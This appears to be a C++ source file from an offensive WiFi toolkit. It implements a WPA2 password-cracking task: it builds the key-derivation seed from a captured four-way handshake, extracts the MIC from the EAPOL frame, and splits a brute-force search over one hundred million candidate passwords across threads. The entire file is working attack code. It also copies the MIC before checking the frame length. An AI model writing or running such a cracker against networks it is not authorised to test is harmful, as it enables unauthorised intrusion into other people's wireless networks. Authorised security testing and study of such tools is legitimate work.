// Created by dev on 8/4/25.
//

#include "wifi-password-cracking-task.hpp"

#include <utility>
#include <unistd.h>
ashk::tasks::WifiPasswordCrackingTask::WifiPasswordCrackingTask(pcpp::PcapLiveDevice *dev,
                                                                std::string iface_name_or_ip,
                                                                std::shared_ptr<HandShakeData> handshake_data,
                                                                int last_task_id)
    : Task(last_task_id), iface_name_or_ip_(std::move(iface_name_or_ip)), handshake_data_(std::move(handshake_data)) {

}

std::string ashk::tasks::WifiPasswordCrackingTask::GetData(tasks_data_id data_id) {
  return std::string();
}

#include <fstream>
void ashk::tasks::WifiPasswordCrackingTask::Exec_() {
  logger_.Log("start password cracking\n");

  uint8_t key_descriptor_version = handshake_data_->eapol[6] & 0b111;

  int mac_cmp = memcmp(handshake_data_->selected_ap->b_ssid.getRawData(),
                       handshake_data_->station_mac.getRawData(), 6);
  int nonce_cmp = memcmp(handshake_data_->ANonce, handshake_data_->SNonce, 32);

  const uint8_t *mac1 = (mac_cmp < 0)
                        ? handshake_data_->selected_ap->b_ssid.getRawData()
                        : handshake_data_->station_mac.getRawData();

  const uint8_t *mac2 = (mac1 == handshake_data_->selected_ap->b_ssid.getRawData())
                        ? handshake_data_->station_mac.getRawData()
                        : handshake_data_->selected_ap->b_ssid.getRawData();

  const uint8_t *nonce1 = (nonce_cmp < 0)
                          ? handshake_data_->ANonce
                          : handshake_data_->SNonce;

  const uint8_t *nonce2 = (nonce1 == handshake_data_->ANonce)
                          ? handshake_data_->SNonce
                          : handshake_data_->ANonce;
  uint8_t seed[100];
  memcpy(seed, mac1, 6);
  memcpy(seed + 6, mac2, 6);
  memcpy(seed + 12, nonce1, 32);
  memcpy(seed + 44, nonce2, 32);
  int epol_ofset = 81;
  if (handshake_data_->eapol[0] == 0x01 && handshake_data_->eapol[1] == 0x03 &&
      handshake_data_->eapol[4] == 0x02 && handshake_data_->eapol[5] == 0x01) {
    epol_ofset = 81;
  } else if (handshake_data_->eapol[0] == 0x02 && handshake_data_->eapol[1] == 0x03 &&
      handshake_data_->eapol[4] == 0x02 && handshake_data_->eapol[5] == 0x01) {
    epol_ofset = 81;
  } else {

    logger_.Log("bad packet\n");
  }
  memcpy(handshake_data_->MIC, handshake_data_->eapol + epol_ofset, 16);

  if (handshake_data_->eapol_size < epol_ofset + 16) {
    logger_.Log("ERROR: EAPOL frame too small (needs at least 97 bytes)\n");
    return;
  }
  uint8_t pmk[32];
  uint8_t mic[20];
  uint8_t ptk[64];

  long long int total_number_of_passwords = 100000000;
  int number_of_threads = (int) sysconf(_SC_NPROCESSORS_ONLN);
  long long int pass_range = total_number_of_passwords / number_of_threads;
  std::vector<WPA2CrackingThread *> threads;

  for (int i = 0; i < number_of_threads; i++) {
    threads.push_back(new WPA2CrackingThread(i * pass_range,
                                             (i + 1) * pass_range,
                                             epol_ofset,
                                             seed,
                                             handshake_data_,
                                             this,
                                             i));
  }
  for (auto i : threads) {
    i->Start();
  }
  while (IsRunning()) {
    std::this_thread::sleep_for(std::chrono::seconds(1));
    int tested = 0;
    for (auto &i : threads) {
      tested += i->t;
    }
    logger_.Log(std::to_string(100 * (float) tested / total_number_of_passwords) + "%\n");
  }
  for (auto i : threads) {
    i->End();
  }

  ashk::Task::End();
}